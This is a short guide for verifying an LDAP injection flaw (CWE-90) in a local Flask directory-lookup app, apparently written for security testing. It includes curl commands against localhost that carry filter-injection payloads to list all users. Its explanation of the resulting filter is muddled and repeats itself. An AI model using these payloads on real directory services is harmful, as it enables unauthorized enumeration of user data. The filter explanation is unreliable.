
# LDAP Injection Vulnerability Verification Guide

## CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')

**Location:**  
- File: `src/app.py`  
- Function: `search()`  
- Approximate Line: 13 (the line constructing `ldap_filter = f"(uid={username})"`)

---

## Step-by-Step Verification Steps

### 1. **Install the dependencies**

If you haven't already:
```bash
cd projects/directory_lookup_tool
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

### 2. **Setup a test LDAP server**

You can use [osixia/docker-openldap](https://github.com/osixia/docker-openldap) for testing:

```bash
docker run --name test-openldap -p 389:389 -e LDAP_ORGANISATION="Example Inc." -e LDAP_DOMAIN="example.com" -e LDAP_ADMIN_PASSWORD="admin" -d osixia/openldap:1.5.0
```

Populate it with some data (see LDAP server documentation for adding test users).

### 3. **Start the Flask application**

```bash
python src/app.py
```

### 4. **Normal Usage Test**

Query for an existing user:

```bash
curl 'http://127.0.0.1:5000/search?username=alice'
```

You should get results for the user (if that user exists in the directory).

---

### 5. **Trigger the Vulnerability (LDAP Injection)**

Try to bypass the intended username filter and enumerate all users.  
Notice how the raw user input is inserted into the LDAP filter, allowing filter manipulation.

#### **Attack input:**
You can use a wildcard to retrieve all users, e.g.:

```bash
curl 'http://127.0.0.1:5000/search?username=*)%28uid=*'
```

This results in the following filter on the server:

```
(uid=*) (uid=*)
```
(but the actual injected filter becomes `(uid=*) (uid=*)`, which will likely be interpreted as always true and may return multiple users depending on the LDAP server's parser)

Alternatively, you can use:

```bash
curl 'http://127.0.0.1:5000/search?username=*)|(uid=*'
```

#### **Expected result:**
The response will include entries for _all_ users, not just the intended user, demonstrating LDAP injection is possible due to unsanitized input.

---

### 6. **Stop the LDAP server (optional)**

```bash
docker stop test-openldap && docker rm test-openldap
```

---

## CWE Reference

- [CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')](https://cwe.mitre.org/data/definitions/90.html)

